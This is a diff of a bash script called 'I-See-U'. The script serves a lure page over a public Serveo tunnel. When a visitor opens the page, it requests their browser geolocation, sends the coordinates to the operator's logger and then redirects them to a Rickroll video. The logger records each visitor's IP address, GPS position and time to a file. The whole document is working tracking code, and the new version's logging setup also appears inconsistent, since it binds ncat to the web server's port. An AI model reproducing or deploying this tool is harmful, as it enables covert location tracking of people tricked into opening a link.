@@ -1,77 +1,76 @@
 #!/bin/bash
 
+PORT=${1:-8080}
+WEB_DIR=~/webpage
+LOG_DIR=~/iseeu/logs
+TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
+LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"
+
 clear
+echo "[*] Starting I-See-U on port $PORT..."
 
-# Prompt for server port
-read -p "[?] Enter port to use for local server (default 8080): " SERVER_PORT
-SERVER_PORT=${SERVER_PORT:-8080}
-
-# Prompt for ncat port
-read -p "[?] Enter port to use for logging with Ncat (must differ, default 9999): " NCAT_PORT
-NCAT_PORT=${NCAT_PORT:-9999}
-
-WEB_DIR="$HOME/webpage"
-
-echo "[*] Killing existing processes..."
-pkill -f "python3 -m http.server" 2>/dev/null
-pkill -f ncat 2>/dev/null
-sleep 1
-
-echo "[*] Creating/clearing web directory: $WEB_DIR"
+# Setup web directory
 mkdir -p "$WEB_DIR"
 rm -f "$WEB_DIR/index.html"
-cd "$WEB_DIR" || exit 1
 
-echo "[*] Creating payload HTML..."
-cat > index.html <<EOF
+# Setup log directory
+mkdir -p "$LOG_DIR"
+touch "$LOG_FILE"
+
+# Create geolocation payload
+cat <<EOF > "$WEB_DIR/index.html"
 <!DOCTYPE html>
 <html>
 <head>
-    <title>I See You</title>
-    <script>
-        function redirectToRickRoll(position) {
-            fetch('http://127.0.0.1:$NCAT_PORT/log?loc=' + position.coords.latitude + ',' + position.coords.longitude);
-            window.location.href = 'https://shattereddisk.github.io/rickroll/rickroll.mp4';
-        }
-        function failLocation() {
-            alert("Location access denied.");
-        }
-        window.onload = () => {
-            navigator.geolocation.getCurrentPosition(redirectToRickRoll, failLocation);
-        };
-    </script>
+  <title>I See You</title>
 </head>
 <body>
-    <h1>Loading...</h1>
+  <script>
+    function sendLocation(position) {
+      var coords = position.coords.latitude + "," + position.coords.longitude;
+      fetch("/logme/" + coords);
+      window.location = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
+    }
+    navigator.geolocation.getCurrentPosition(sendLocation);
+  </script>
+  <h1>Loading...</h1>
 </body>
 </html>
 EOF
 
-echo "[*] Starting local server on port $SERVER_PORT..."
-python3 -m http.server "$SERVER_PORT" > /dev/null 2>&1 &
+# Start local Python server
+cd "$WEB_DIR" || exit 1
+python3 -m http.server "$PORT" > /dev/null 2>&1 &
 SERVER_PID=$!
-sleep 2
-echo "[+] Python server running (PID $SERVER_PID)"
+echo "[+] Local server started (PID $SERVER_PID)"
 
+# Start Serveo tunnel
 echo "[*] Starting Serveo tunnel..."
-ssh -o StrictHostKeyChecking=no -R 80:localhost:$SERVER_PORT serveo.net > serveo.log 2>&1 &
+ssh -o StrictHostKeyChecking=no -R 80:localhost:$PORT serveo.net > serveo_url.txt 2>&1 &
 SSH_PID=$!
-sleep 5
 
-TUNNEL_URL=$(grep -oE "https://[a-zA-Z0-9]+\.serveo.net" serveo.log | head -n1)
-if [ -n "$TUNNEL_URL" ]; then
-    echo "[✓] Public URL: $TUNNEL_URL"
+sleep 5
+URL=$(grep -oE 'https://[a-z0-9]+\.serveo\.net' serveo_url.txt | head -n 1)
+
+if [[ -n "$URL" ]]; then
+  echo "[✓] Public URL: $URL"
 else
-    echo "[✗] Failed to get Serveo URL."
-    kill $SERVER_PID $SSH_PID
-    exit 1
+  echo "[✗] Failed to get Serveo URL"
+  kill "$SERVER_PID" "$SSH_PID" 2>/dev/null
+  exit 1
 fi
 
-echo "[*] Logging connections with ncat on port $NCAT_PORT..."
-ncat -lvkp "$NCAT_PORT" &
-NCAT_PID=$!
+# Start logging server
+echo "[*] Logging to $LOG_FILE"
+ncat -k -l "$PORT" --ssl --keep-open --exec "/bin/bash -c '
+  while read line; do
+    if [[ \$line == *\"/logme/\"* ]]; then
+      gps=\$(echo \$line | cut -d\" \" -f2 | cut -d/ -f3)
+      echo \"IP: \$REMOTE_HOST | GPS: \$gps | Time: \$(date)\" >> \"$LOG_FILE\"
+    fi
+  done
+'" &
 
-trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $SSH_PID $NCAT_PID 2>/dev/null; exit' INT
-
+trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $SSH_PID; echo "[*] Done."' EXIT
 echo "[*] Press Ctrl+C to stop."
 wait
